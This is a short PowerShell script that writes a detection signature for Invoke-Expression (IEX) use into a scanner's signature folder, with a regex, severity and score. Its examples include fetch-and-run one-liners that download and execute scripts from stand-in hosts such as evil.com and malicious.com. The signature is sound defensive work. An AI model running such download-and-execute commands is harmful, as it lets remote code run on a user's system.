@"
<#
.SYNOPSIS
    Invoke-Expression Command Execution

.DESCRIPTION
    Detects use of Invoke-Expression (IEX) which can execute arbitrary code

.SEVERITY
    high

.CATEGORY
    obfuscation

.SCORE
    85

.REGEX
    (Invoke-Expression|IEX)\s*

.FLAGS
    i

.EXAMPLES
    Invoke-Expression `$maliciousCode
    IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
#>

# Exemplos de comandos que seriam detectados:
# Invoke-Expression `$downloadedScript
# IEX (wget http://malicious.com/payload.ps1)
"@ | Out-File -FilePath ".\signatures\suspicious\obfuscation\invoke-expression.ps1" -Encoding UTF8